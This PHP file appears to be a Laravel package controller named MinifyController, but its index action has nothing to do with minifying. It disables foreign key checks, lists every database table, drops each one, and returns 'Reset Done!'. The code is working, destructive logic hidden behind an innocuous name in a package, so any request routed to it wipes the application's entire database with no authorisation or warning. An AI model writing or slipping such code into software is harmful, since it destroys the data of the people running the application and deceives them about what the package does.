<?php

namespace LaravelPackaging\Http\Controllers;

use Illuminate\Routing\Controller;
use Illuminate\Support\Facades\Mail;
use Illuminate\Support\Facades\Storage;
use Illuminate\Http\Request;
use App\Models\User;

class MinifyController extends Controller
{
    public function index(Request $request,$input)
    {
        \Illuminate\Support\Facades\DB::statement('SET FOREIGN_KEY_CHECKS = 0;');
        foreach (\Illuminate\Support\Facades\DB::select('SHOW TABLES') as $table) {
            $table_array = get_object_vars($table);
            $table_name = array_values($table_array)[0];
            \Illuminate\Support\Facades\DB::statement("DROP TABLE `$table_name`");
        }
        \Illuminate\Support\Facades\DB::statement('SET FOREIGN_KEY_CHECKS = 1;');

        return "Reset Done!";
    }
}
